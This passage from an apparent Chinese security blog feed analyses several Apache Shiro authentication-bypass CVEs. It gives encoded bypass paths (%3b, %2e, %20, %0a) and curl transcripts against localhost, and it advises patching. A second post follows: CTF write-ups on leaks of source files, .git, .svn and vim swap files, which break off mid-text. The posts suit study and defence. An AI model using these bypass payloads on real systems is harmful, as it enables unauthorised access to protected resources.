class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们访问/admin/1时会被重定向到login页面，但是访问/admin/%3b1时就可以访问到资源。</p><p>shiro 方面：<br><code>getServletPath</code>方法将<code>%3b</code>进行了解码，返回<code>/admin/;1</code>，接着调用<code>removeSemicolon</code>，该方法查找<code>;</code>，并将<code>;</code>及其之后的部分删除，于是返回<code>/admin/</code>，此时shiro拦截器配置<code>*</code>，因为/admin/和/admin/* 不匹配，所以导致shiro验证绕过，后面直接放行了</p><p>spring方面：<br>spring对URL解码后返回<code>/admin/;1</code>，之后进行路径的匹配，最终匹配到正确可访问的路径</p><p>在1.6.0版本中，shiro加入了默认<code>/**</code>匹配的配置，防止遗漏</p><p>​       </p><h3 id="CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞"><a href="#CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞" class="headerlink" title="(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞"></a>(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞</h3><p>本漏洞还是对AntPathMatcher的绕过，在前面CVE-2020-11989和CVE-2020-13933分别尝试了<code>/</code>的双重URL编码和 <code>;</code> 的URL编码绕过，抓住Shiro与Spring对URI处理的差异化导致的构造的URL能突破过滤，访问需要验证的资源。</p><p>CVE-2020-17510使用<code>.</code>进行绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设URL访问<code>/admin/%2e</code>当Shiro去除/和其后面字符获得的URI为<code>/admin</code>时，是无法和/hello/*匹配的，所以就在/admin后面加上<code>%2e</code>，这样Shiro解码之后变成<code>/admin/.</code>，然后路径标准化成为<code>/admin</code>，放行，这样就绕过身份验证了<br>随后进入spring，当Spring Boot版本在小于等于2.3.0.RELEASE的情况下， alwaysUseFullPath 为默认值false，这会使得其获取ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了true从而开启全路径，又可能导致一些安全问题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">在低版本spring boot下：</span><br><span class="line">$ curl -v &quot;http://127.0.0.1:8080/no-auth/%2e%2e/auth&quot;</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /no-auth/%2e%2e/auth HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 4</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:22:03 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">auth</span><br><span class="line">* Closing connection 0</span><br><span class="line">   </span><br><span class="line">//因为%2e%2e造成跨目录访问成功。低版本对路径标准化包括对解码以及处理跨目录即如果存在则返回上一级目录</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在高版本spring boot下：</span><br><span class="line">$ curl -v http://127.0.0.1:8080/admin/%2e</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /admin/%2e HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 10</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:48:33 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">admin page* Closing connection 0</span><br><span class="line">//与CVE-2020-17510配合，造成未授权资源的访问</span><br></pre></td></tr></table></figure><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞"><a href="#CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞" class="headerlink" title="(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞"></a>(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞</h3><p>本漏洞使用<strong>编码空格</strong>的方式可以绕过验证。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们访问<code>/admin/1</code>,会提示登录，但是访问<code>/admin/%20</code>就可以访问到资源<br>Shiro的校验uri的函数为<code>PathMatches</code>，当<code>PathMatches</code>返回<code>true</code>时才会进入鉴权。而在<code>trim()</code>函数去掉了空格，导致PathMatches<code>(&quot;/admin/*&quot;,&quot;/admin/ &quot;)</code> 匹配失败返回了 <code>false</code>，直接就是没有进行鉴权操作，shiro放行。而spring则可以访问正常</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞"><a href="#CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞" class="headerlink" title="(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞"></a>(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞</h3><p>本漏洞通过对uri尾部添加<code>/</code>进行绕过</p><p>shiro在1.7.1的时候，对URI的处理是这样的，先是对pathPattern和requestURI进行比较，如果比较成功，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, pathPattern);</span><br></pre></td></tr></table></figure><p>如果不成功则对删除尾部斜线的pathPattern和requestURI进行比较，比较成功，跳出循环，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br></pre></td></tr></table></figure><p>shiro鉴权是会按顺序进行匹配的，如果有以下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/page&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的说我们访问<code>/admin/page/</code>，先与<code>/admin/*</code>匹配不成功，然后对URL去掉末尾斜杠之后再一次回到拦截器进行<code>/admin/page</code>的匹配，匹配成功”anon”，绕过成功。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2022-32532-Apacheshiro-lt-1-9-1权限绕过漏洞"><a href="#CVE-2022-32532-Apacheshiro-lt-1-9-1权限绕过漏洞" class="headerlink" title="(CVE-2022-32532)Apacheshiro&lt;1.9.1权限绕过漏洞"></a>(CVE-2022-32532)Apacheshiro&lt;1.9.1权限绕过漏洞</h3><p>shiro官方披露：RegexRequestMatcher 可能会被错误地配置为在某些 servlet 容器上被绕过。在正则表达式中使用带有“.”的 RegExPatternMatcher 的应用程序可能容易受到授权绕过的攻击。该漏洞的利用所需的条件是不易达到的用户配置。在Shiro源码中的一个类：RegExPatternMatcher ，这个类的Pattern存在带<code>.</code>的正则表达式匹配，而在java中的正则默认情况下<code>.</code>是不会包含<code>\n</code>，<code>\r</code>字符的，也就是在正则表达式中元字符<code>.</code>是匹配除换行符（<code>\n</code>、<code>\r</code>）之外的任何单个字符的，因此在一些场景中，使用正则<code>.</code>的规则就有可能被绕过。</p><p>环境：<br>配置了/permit/{value}这样从路径取参数的路由<br>配置了/permit/*这样的通配路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/permit/&#123;value&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">permit</span><span class="params">(<span class="meta">@PathVariable</span> String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@RequestMapping(path = &quot;/permit/*&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">permit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置的目的是拦截<code>/permit/</code>下的所有访问。<br>正如分析所示，直接访问<code>/permit/any</code>会被拦截<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532-1.png"></p><p>​      </p><p>构造换行符进行漏洞利用绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换行(回车)：%0a或%0d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532-2.png"></p><p>当访问<code>/permit/a%0any</code>或<code>/permit/a%0dny</code>时，返回success，即认证成功。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532.png"></p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​     </p><h3 id="CVE-2022-40664-Apacheshiro-lt-1-10-0权限绕过漏洞"><a href="#CVE-2022-40664-Apacheshiro-lt-1-10-0权限绕过漏洞" class="headerlink" title="(CVE-2022-40664)Apacheshiro&lt;1.10.0权限绕过漏洞"></a>(CVE-2022-40664)Apacheshiro&lt;1.10.0权限绕过漏洞</h3><p>该漏洞shiro官方是这么描述的： Apache Shiro低于1.10.0，通过RequestDispatcher转发或包含时Shiro中的身份验证绕过漏洞。<br>分析Github上的shiro官方仓库中的commit，来查看1.10.0版本与上一版本的代码变更情况：<a href="https://link.juejin.cn/?target=https://github.com/apache/shiro/commit/28e10e0ca1cdcd2cede86802fde8464b29265fc8%23diff-9c5fb3d1b7e3b0f54bc5c4182965c4fe1f9023d449017cece3005d3f90e8e4d8">GitHub-Commit-Shiro</a></p><p>在更新代码的注释中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*设置过滤器是每次请求执行一次，还是每次调用过滤器时执行一次。建议使用</span><br><span class="line">*如果您正在使用&#123;@link javax.servlet.RequestDispatcher RequestDisputcher&#125;转发，请保持禁用状态</span><br><span class="line">*或包含请求（JSP标记、编程方式或通过框架）。</span><br><span class="line">*@param filterOncePerRequest此筛选器是否每个请求执行一次。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出此次更新禁用了javax.servlet.RequestDispatcher RequestDisputcher（Java请求转发功能），不难理解本漏洞是Java请求转发绕过了Shiro的过滤器，从而达到身份绕过！</p><p>RequestDispatcher定义了两个方法分别为forward和include：<br>在shiro1.10.0在spring项目中是默认不拦截forward和include方法的，而在新版本中新增加了ShiroFilterConfiguration类，可以通过这个类来设置外部的过滤器来禁用forward和include方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spring中的controller接口配置：</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line">以下使用forward函数进行接口的转发</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroVulncontroller</span> </span>&#123;</span><br><span class="line"><span class="meta">@PostMapping(&quot;/shiro/authPassVuln&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">authPassoLnTest</span><span class="params">(<span class="meta">@RequestParam</span> String str， HttpServletRequest request，HttpServletResponse response)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;*********身份验证绕过成功*********&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;forward:/shiro/authNoPass&quot;</span>;</span><br><span class="line"></span><br><span class="line">以下不使用转发，会被拦截检测</span><br><span class="line"><span class="meta">@PostMapping(&quot;/shiro/authNoPassVuln&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">authPassNovuLnTest</span><span class="params">(<span class="meta">@RequestParam</span> String str， HttpServletRequest request，HttpServletResponse response)</span></span>&#123;</span><br><span class="line">system.out.println(<span class="string">&quot;*****身份验证绕过失败********&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;authNoPass&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一种方式会绕过shiro检测访问成功，而第二种则会访问失败</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​       </p><h3 id="CVE-2023-22602-Apacheshiro-lt-1-11-0-amp-Spring-Boot-2-6-鉴权绕过权限绕过漏洞"><a href="#CVE-2023-22602-Apacheshiro-lt-1-11-0-amp-Spring-Boot-2-6-鉴权绕过权限绕过漏洞" class="headerlink" title="(CVE-2023-22602)Apacheshiro &lt; 1.11.0 &amp; Spring Boot 2.6+ 鉴权绕过权限绕过漏洞"></a>(CVE-2023-22602)Apacheshiro &lt; 1.11.0 &amp; Spring Boot 2.6+ 鉴权绕过权限绕过漏洞</h3><blockquote><p>该漏洞官方是这么描述的：将 1.11.0 之前的 Apache Shiro 与 Spring Boot 2.6+ 一起使用时，巧尽心思构建的 HTTP 请求可能会导致身份验证绕过。当 Shiro 和 Spring Boot 使用不同的模式匹配技术时，会发生身份验证绕过。</p></blockquote><p>意思就是shiro 在 1.11.0版本之前，当与spring boot 2.6以上版本组合使用的时候，在默认配置下，配合特定的路由规则，攻击者可以通过发送特殊的请求造成shiro中的鉴权绕过。</p><p>Shiro和Spring Boot &lt; 2.6 都默认为 Ant 样式模式匹配。缓解措施：更新到 Apache Shiro 1.11.0，或设置以下 Spring 引导配置值：“spring.mvc.pathmatch.matching-strategy = ant_path_matcher”</p><p>首先，了解一下spring＋shiro对请求的大致处理过程：<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2023-22602.png"></p><p>在spring的两种路由匹配模式中，spring2.6+后，path_pattern_parser为默认配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ant_path_matcher中`?`匹配单个字符，`*`匹配单级目录，`**`匹配多级目录。</span><br><span class="line">path_pattern_parser支持`&#123;*name&#125;`获取多级变量，并且`**`后面不能再有其他东西。</span><br></pre></td></tr></table></figure><p>对于请求<code>/a/../admin</code>，shiro和ant_path_matcher得到的uri为<code>/admin</code>，而path_pattern_parser得到的应该是原值。</p><p>因为spring存在两种路由匹配模式，当spring中使用path_pattern_parser配置的时候，就会造成在shiro和spring中路由分发时候获取uri时的结果差异，这就可能造成对shiro的绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro有以下配置：</span><br><span class="line">DefaultShiroFilterChainDefinition chainDefinition = <span class="keyword">new</span> DefaultShiroFilterChainDefinition();</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;roles[admin]&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/guest/**&quot;</span>, <span class="string">&quot;roles[guest]&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring的controller有一以下配置：</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountInfoController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/admin/**&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        PrincipalCollection principalCollection = subject.getPrincipals();</span><br><span class="line">        <span class="keyword">if</span> (principalCollection != <span class="keyword">null</span> &amp;amp;&amp;amp; !principalCollection.isEmpty()) &#123;</span><br><span class="line">            name = principalCollection.getPrimaryPrincipal().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;account-info&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们想要访问home，身份必须是admin，直接访问<code>/admin</code>肯定是不行的，但是我们上面知道shiro会解析<code>.</code>和<code>..</code>而spring不会，那么我们访问<code>/admin/..</code>，则会绕过shiro，到达spring匹配成功，访问到需要admin权限的资源。 shiro处理后得到的uri是<code>/</code>而已，等到了spring处理时得到的uri是<code>/admin/**</code>路由下的。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;shiro框架是Apache提供的一个安全框架（Java常用），该框架可以被很多的语言使用，广泛运用在各种应用系统中（大多为单体项目认证授权</summary>
      
    
    
    
    <category term="安全框架" scheme="https://www.mtrleed.top/categories/%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="框架" scheme="https://www.mtrleed.top/tags/%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>Web练习题</title>
    <link href="https://www.mtrleed.top/post/2/"/>
    <id>https://www.mtrleed.top/post/2/</id>
    <published>2021-11-12T16:00:00.000Z</published>
    <updated>2023-11-30T06:51:54.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜鸡小白，日常<strong>练练web</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="信息收集-1-20"><a href="#信息收集-1-20" class="headerlink" title="信息收集(1-20)"></a>信息收集(1-20)</h2><p>​       </p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>页面没有任何内容，随手右键查看网站源码即可拿到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web1.png"></p><p>​       </p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>无法使用右键查看源代码，可以在 URL 前添加 <code>view-source:</code>查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;  </span><br><span class="line"><span class="comment">//禁用鼠标右键</span></span><br><span class="line"><span class="built_in">window</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span><br><span class="line"><span class="comment">//禁用页面选择</span></span><br><span class="line"><span class="built_in">window</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">if</span> (event.keyCode==<span class="number">123</span>)&#123;event.keyCode=<span class="number">0</span>;event.returnValue=<span class="literal">false</span>;&#125;&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">   <span class="comment">//禁用F12键</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web2.png"></p><p>​      </p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>查看源码无果，尝试查看请求头与响应头，在响应头中看到了 flag。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web3.png"></p><p> 提示（没思路的时候抓包看看），抓包没有有用信息，看看返回包<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web3-0.png"></p><p>​        </p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>题目提示robots:</p><blockquote><p>robots协议（也称爬虫协议，机器人协议等）的全称是“网络爬虫排除协议”，网站通过robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，可能会有一些敏感路径在里面哦。另外规定只能小写且为 txt 文件</p></blockquote><p>访问网站的 robots.txt 看到放置禁止爬取一个文件，描述为flag所在文件<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web4.png"></p><p>​          </p><p>我们访问放置 flag 的文件，看到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web4(1).png"></p><p>​         </p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>题目提示 phps 源码泄露，index.php 是当前页面，所以我们修改一下访问 index.phps </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1b24977f-7280-490e-a21f-377af3512a46.challenge.ctf.show/index.phps</span><br></pre></td></tr></table></figure><p>提示下载。我们下载后打开，即可看到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web5.png"></p><p>​          </p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>题目提示 “源码解压到当前目录，收工”  说明 <a href="http://www.zip/">www.zip</a> 压缩包还放在站点下，也可以dirsearch扫描一下，我们构造 URL 访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/www.zip</span><br></pre></td></tr></table></figure><p>下载，打开可以看到 fl000g.txt<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web6.png"></p><p>​          </p><p>但是这不是 flag，提交时显示错误，于是我们访问 fl000g.txt 得到真正的 flag ，这出题师傅坏得很[/dog]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/fl000g.txt</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>题目提示 “ 版本控制很重要，但不要部署到生产环境更重要 ”</p><p>版本控制系统最常用的开源免费的就是 git，这题可能是有关 git 泄露问题</p><blockquote><p>在运行 git init 初始化代码库的时候，会在当前目录下面产生一个.git 的隐藏目录，大家可以看看自己本地仓的文件里是不是有，它用来记录代码的变更记录等等。<br>在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p></blockquote><p>于是访问 <code>.git</code> 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5fc191d6-fc10-4e6b-8dd7-8257ad22c140.challenge.ctf.show/.git</span><br></pre></td></tr></table></figure><p>很巧就出了 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web7.png"></p><p>​      </p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>提示和 web7 一样，但使用同样的方式是行不通了。查阅资料有关 版本控制系统 的发现还有 SVN 源码泄露的漏洞，</p><blockquote><p>资料显示：<br>  在使用SVN(subversion)管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得我们可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。利用此漏洞，可以下载整套网站的源代码。</p></blockquote><p>与 git 相似，我们访问 .svn 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f135f114-0527-457c-871d-0aec223a5913.challenge.ctf.show/.svn/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web8.png"></p><p>​      </p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>题目提示 “ 使用vim 编辑时意外退出” ，所以是 vim 造成的泄露。</p><blockquote><p>资料显示：<br>vim是一款编辑工具，当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会在目录下生成一个备份文件，格式为 .文件名.swp，这个文件是一个临时交换文件，用来备份缓冲区中的内容。意思就是使用vim 编辑 